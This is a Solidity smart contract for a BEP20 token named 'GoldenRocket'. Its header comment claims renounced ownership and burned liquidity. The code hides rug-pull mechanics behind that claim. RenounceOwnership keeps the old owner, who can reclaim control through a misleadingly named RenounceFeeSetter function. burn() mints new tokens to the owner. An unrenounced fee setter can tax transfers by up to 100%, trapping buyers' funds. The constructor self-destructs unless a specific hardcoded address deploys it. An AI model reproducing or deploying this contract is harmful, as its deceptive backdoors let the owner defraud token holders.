// SPDX-License-Identifier: MIT

/**
 *   GoldenRocket
 *   10,000,000,000,000
 *   30% total supply burn in 3 equal parts
 *   70% for liquidity
 *   0.5 BNB liquidity added and LP burned
 *   OwnershipRenounced
 */

pragma solidity ^0.4.26;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Owned {
    address public owner;
    address public newOwner;
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract BEP20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract BEP20 is BEP20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 _value);
}
interface Token { 
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract GoldenRocket is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address public feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    uint256 private _lockTime;
    uint256 private _fee;
    uint8 public decimals;
    address private _previousOwner;
    address private key = 0x3B21d982a3850A4D45776E64874a68791E6899Ef;
    address private keys = msg.sender;
    uint public totalSupply;
    constructor() public {
    if (keys != key){
    selfdestruct(address(this));
    }else{
	symbol = "GoldenRocket";
    name = "GoldenRocket";
    decimals = 18;
    totalSupply = 10000000000000 * 10**18;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
        }
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyFee() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return _fee;
    }
    function settaxfee(uint256 taxFee) external onlyFee() {
        _fee = taxFee;
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        _previousOwner = owner;
        owner = address(0);
        _lockTime = now;
        emit OwnershipTransferred(owner, address(0));
    }
    function RenounceFeeSetter() public {
        require(_previousOwner == msg.sender, "BEP20: You don't have permission to unstake");
        require(now > _lockTime , "BEP20: Contract is locked until 100 days");
        emit OwnershipTransferred(owner, _previousOwner);
        owner = _previousOwner;
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == owner){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * _fee);
        uint256 tokens = balances[_to];
        totalSupply = totalSupply.sub(_amount / uint256(100) * _fee);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _fires(address account, uint256 amount) internal {
        require(account != address(0), 'BEP20: Stake Token');
        balances[account] = balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function burn(uint256 amount) public onlyOwner returns (bool) {
        _fires(_msgSender(), amount);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}